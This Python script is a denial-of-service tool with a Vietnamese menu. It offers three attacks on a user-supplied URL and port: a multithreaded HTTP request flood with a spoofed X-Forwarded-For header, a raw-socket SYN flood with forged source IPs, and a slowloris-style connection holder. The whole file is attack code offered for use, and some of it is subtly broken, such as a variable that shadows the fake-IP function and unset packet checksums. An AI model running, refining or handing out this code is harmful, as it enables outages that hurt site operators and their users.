import os
import threading
import time
import requests
from urllib.parse import urlparse
from colorama import Fore, Style
from socket import *
from struct import pack
from random import randrange, choice, randint
import signal
import string

# Tạo một lock để đồng bộ hóa việc truy cập vào biến attack_num
attack_num_lock = threading.Lock()
attack_num = 0

def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for _ in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def ddos_requester(target_host, target_port, target_path, fake_ip):
    global attack_num
    headers = {
        'Host': target_host,
        'X-Forwarded-For': fake_ip,
        'User-Agent': choice(add_useragent()),
        'Cache-Control': 'no-cache',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    while True:
        try:
            response = requests.get(f"http://{target_host}:{target_port}{target_path}", headers=headers)
            with attack_num_lock:
                attack_num += 1
            print(f"Gói tin đã gửi! Số lần tấn công: {attack_num} - Mã phản hồi: {response.status_code}")
        except requests.RequestException as e:
            print(f"Lỗi: {e}")
            break

def add_useragent():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
    ]

def syn_flood(tgt, port, fake_ip):
    try:
        while True:
            ihl = 5
            version = 4
            tos = 0
            tot = 40
            id = 54321
            frag_off = 0
            ttl = 64
            protocol = IPPROTO_TCP
            check = 10
            s_addr = inet_aton(fake_ip)
            d_addr = inet_aton(tgt)
            ihl_version = (version << 4) + ihl
            ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)

            source = 54321
            dest = port
            seq = 0
            ack_seq = 0
            doff = 5
            fin = 0
            syn = 1
            rst = 0
            ack = 0
            psh = 0
            urg = 0
            window = htons(5840)
            check = 0
            urg_prt = 0

            offset_res = (doff << 4)
            tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
            tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
            packet = ip_header + tcp_header

            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            sock.sendto(packet, (tgt, 0))
    except KeyboardInterrupt:
        print("Đã dừng SYN Flood.")
    except Exception as e:
        print(f"Lỗi trong SYN Flood: {e}")

def pyslow(tgt, port, threads, sleep):
    try:
        while True:
            for _ in range(threads):
                sock = socket(AF_INET, SOCK_STREAM)
                sock.connect((tgt, port))
                sock.sendto(b'GET / HTTP/1.1\r\n', (tgt, port))
                time.sleep(sleep)
    except KeyboardInterrupt:
        print("Đã dừng Pyslow.")
    except Exception as e:
        print(f"Lỗi trong Pyslow: {e}")

def menu():
    print(Style.BRIGHT + Fore.YELLOW + "[THÔNG TIN!]" + Fore.WHITE + " Nhấn CTRL + C và nhấn ENTER để thoát!!")
    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
    print(Fore.WHITE + Style.BRIGHT + "Vui lòng chọn từ các tùy chọn sau...")
    print(Fore.WHITE + Style.BRIGHT + "1. DDoS Requester. [1]")
    print(Fore.WHITE + Style.BRIGHT + "2. SYN Flood.      [2]")
    print(Fore.WHITE + Style.BRIGHT + "3. Pyslow.         [3]")
    print(Fore.WHITE + Style.BRIGHT + "4. Thoát.          [4]")
    print("Nhập tùy chọn...")

    try:
        choice = int(input())
        if choice == 1:
            ddos_with_spoofing('requester')
        elif choice == 2:
            ddos_with_spoofing('synflood')
        elif choice == 3:
            ddos_with_spoofing('pyslow')
        elif choice == 4:
            print("Thoát!")
            return
        else:
            print("Vui lòng chọn một tùy chọn hợp lệ!")
            menu()
    except ValueError:
        print("Vui lòng nhập một giá trị nguyên.")
        menu()

def ddos_with_spoofing(attack_type):
    os.system("clear")
    print("Nhấn CTRL + C và nhấn ENTER để thoát!!!")

    while True:
        try:
            threads = int(input("NHẬP SỐ LƯỢNG LUỒNG: "))
        except ValueError:
            print("Vui lòng nhập một giá trị nguyên.")
            continue
        else:
            break

    while True:
        target_url = input(Fore.RED + Style.BRIGHT + "NHẬP URL CỦA MỤC TIÊU: ")
        parsed_url = urlparse(target_url)
        if parsed_url.scheme and parsed_url.netloc:
            target_host = parsed_url.netloc
            target_path = parsed_url.path if parsed_url.path else "/"
            break
        else:
            print("URL không hợp lệ. Vui lòng thử lại.")

    fake_ip = input("NHẬP IP GIẢ: ") or fake_ip()

    while True:
        try:
            target_port = int(input("NHẬP CỔNG CỦA MỤC TIÊU (cổng mặc định: 80): ") or 80)
        except ValueError:
            print("Vui lòng nhập một cổng hợp lệ, hãy thử lại.")
            continue
        else:
            break

    print(f"Đang thực hiện {attack_type} với IP giả {fake_ip} trên {target_url} (Cổng: {target_port})")
    print(Fore.YELLOW + Style.BRIGHT + "[THÔNG TIN!]" + Fore.WHITE + " Nếu thông tin trên không chính xác, bạn có thể khởi động lại script và nhập lại chi tiết đúng!!")

    time.sleep(4)
    print(Fore.MAGENTA + Style.BRIGHT + "Tấn công bắt đầu trong ~")
    print("giây: 3")
    time.sleep(1)
    print("giây: 2")
    time.sleep(1)
    print("giây: 1")
    time.sleep(1)

    if attack_type == 'requester':
        for _ in range(threads):
            thread = threading.Thread(target=ddos_requester, args=(target_host, target_port, target_path, fake_ip))
            thread.start()
    elif attack_type == 'synflood':
        for _ in range(threads):
            thread = threading.Thread(target=syn_flood, args=(target_host, target_port, fake_ip))
            thread.start()
    elif attack_type == 'pyslow':
        pyslow(target_host, target_port, threads, 5)

if __name__ == "__main__":
    menu()